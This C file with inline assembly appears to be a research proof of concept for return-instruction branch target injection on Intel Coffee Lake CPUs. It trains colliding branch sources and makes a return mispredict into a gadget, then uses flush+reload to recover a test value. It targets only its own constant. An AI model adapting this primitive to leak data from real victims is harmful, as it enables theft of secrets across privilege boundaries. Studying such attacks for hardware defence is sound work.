// SPDX-License-Identifier: GPL-3.0-only
#include "common.h"
#include <err.h>
#include <string.h>
#include <stdlib.h>

// reload buffer entry that will turn hot as a reslut of mispeculation
#define SECRET 10

#define ROUNDS 9999

// RB, reload buffer
#define RB_PTR 0x13000000
#define RB_STRIDE_BITS 12
#define RB_SLOTS 0x10

// COFFEE LAKEs, these addresses should collide if the lower 13 bits are
// matching.
#define BR_SRC1 0x120000000
#define BR_SRC2 0x100200000 

typedef unsigned long u64;
typedef unsigned char u8;
__attribute__((aligned(4096))) static u64 results[RB_SLOTS] = {0};

// discloure gadget. leak content of "rdi", which is number 0 -- RB_SLOTS
void train_dst();
asm(
    ".align 0x1000\n\t"
    "train_dst:\n\t"
    "shl $" xstr(RB_STRIDE_BITS) ", %rdi\n\t"
    "mov "xstr(RB_PTR) "(%rdi), %rax\n\t"
    "lfence\n\t" // stop here when speculating ;)
    "jmp flush\n\t"
);

// the spec_dst is the real path. we want to land at train_dst instead of here
// to have a successful misprediction.
void spec_dst();
asm(
    "spec_dst:\n\t"
    "lfence\n\t" // stop here when speculating ;)
    "jmp reload\n\t"
);

__attribute__((aligned(1024)))
static void print_results(u64 *results, int n) {
    for (int i = 0; i < n; ++i) {
        printf("%lu ", results[i]);
    }
    puts("");
}


// use return instruction to mispredict
#define USE_RET 
// use return instruction for training
//#define USE_RET_TRAINING 

/**
 * Calling this template, because this code is never directly executed. It is
 * copied to BR_SRC1 and executed there. We have two macros that changes the
 * behavior. 
 * - USE_RET: the interesting one, using ret instruction when returning from the
 *   mispredicting function, otherwise it uses jmp *
 * - USE_TRAINING_RET: use a ret for training. use a jmp* otherwise. 
 *
 * The table below displays what we've observed with the combination of the two:
 *
 *  Tr \ Sp | ret | jmp*
 *  --------+-----+------
 *  ret     |  Y  |  N (training with ret does not seem to affect jmp*)
 *  jmp*    |  Y  |  Y
 *
 */
void br_src_training_tmpl_end();
void br_src_training_tmpl();
asm(
    ".align 0x80000\n\t"
    "br_src_training_tmpl:\n\t"
    "mfence\n\t"
#ifdef USE_RET_TRAINING
    "push (%r8)\n\t"
    "ret\n\t"
#else
    "nop\n\t"
    "jmp *(%r8)\n\t"
#endif
    "br_src_training_tmpl_end:\n\t"
);

void br_src_mispredict_tmpl_end();
void br_src_mispredict_tmpl();
asm(
    ".align 0x80000\n\t"
    "br_src_mispredict_tmpl:\n\t"
    "mfence\n\t"
#ifdef USE_RET
    "nop\n\t" // magic ;)
    "push (%r8)\n\t"
    "ret\n\t"
#else // USE_RET
    "nop\n\t"
    "jmp *(%r8)\n\t"
#endif
    "br_src_mispredict_tmpl_end:\n\t"
);

// somehow adding more does not improve results. 29 works well on Coffee Lake
// but 29 does not work at all on Coffee Lake Refresh. To make Coffee Lake
// Refresh mispredict on returns, set it to 28
#define RET_PATH_LENGTH 29
#define TRAIN_PATH 0x280000

int main(int argc, char *argv[])
{
    memset(results, 0, sizeof(results[0])*RB_SLOTS);
    // somehow we're not always getting THP, so we map with HUGETLB here instead
    MAP_OR_DIE((u8 *)RB_PTR, 1<<21, PROT_RW, MMAP_FLAGS|MAP_HUGETLB, -1, 0);

    u64 dst_ptr = 0;
    u64 ret_path[RET_PATH_LENGTH] = {0};
    u64 br_src_training_sz = br_src_training_tmpl_end - br_src_training_tmpl;
    u64 br_src_mispredict_sz = br_src_mispredict_tmpl_end - br_src_mispredict_tmpl;

    MAP_OR_DIE((u8*)(TRAIN_PATH & ~0xfff), 0x1000, PROT_RWX, MMAP_FLAGS, -1, 0);
    memcpy((u8*)TRAIN_PATH, "\xc3", 1); // ret;
    MAP_OR_DIE((u8*)(BR_SRC1 & ~0xfff), PG_ROUND(br_src_training_sz), PROT_RWX, MMAP_FLAGS, -1, 0);
    MAP_OR_DIE((u8*)(BR_SRC2 & ~0xfff), PG_ROUND(br_src_mispredict_sz), PROT_RWX, MMAP_FLAGS, -1, 0);
    memcpy((u8 *)BR_SRC1, br_src_training_tmpl, br_src_training_sz);
    memcpy((u8 *)BR_SRC2, br_src_mispredict_tmpl, br_src_mispredict_tmpl_end-br_src_mispredict_tmpl);
    for (int i = 0; i < RET_PATH_LENGTH; ++i) {
        ret_path[i] = TRAIN_PATH;
    }

    for (int i = 0; i<ROUNDS; ++i) {
        dst_ptr = (u64)train_dst; // activate CL
        for (int j = 0; j < 3; ++j){
            asm(
                    "mov %0, %%r8\n\t"
                    "mov $0x2, %%rdi\n\t" // can be anything in bounds of RB
                    "pushq %[br_src]\n\t"
                    "mov %[retp], %%r10 \n\t"
                    ".rept " xstr(RET_PATH_LENGTH) "\n\t"
                    "pushq (%%r10)\n\t"
                    "add $8, %%r10\n\t"
                    ".endr\n\t"
                    "ret\n\t" :: "r"(&dst_ptr), [retp]"r"(ret_path), [br_src]"r"(BR_SRC1) : "rax", "rdi", "r8", "r10"
               );
            // come back here from train_dst
            asm("flush:lfence");
        }
        // now we change it so that we jump to spec_dst instead of train_dst,
        // spec_dst does nothing. But we will still observe train_dst being
        // executed
        dst_ptr = (u64)spec_dst;
        flush_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS); 
        asm(
            "mov %0, %%r8\n\t"
            "mov $"xstr(SECRET)", %%rdi\n\t"
            "pushq %[br_src]\n\t"
            "mov %[retp], %%r10 \n\t"
            ".rept " xstr(RET_PATH_LENGTH) "\n\t"
            "pushq (%%r10)\n\t"
            "add $8, %%r10\n\t"
            ".endr\n\t"
            "ret\n\t"
            :: "r"(&dst_ptr), [retp]"r"(ret_path), [br_src]"r"(BR_SRC2): "rax", "rdi", "r8", "r10"
        );
        // come back  from spec_dst here.
        asm("reload:");
        reload_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS, results);
    }
    print_results(results, RB_SLOTS);
    return 0;
}
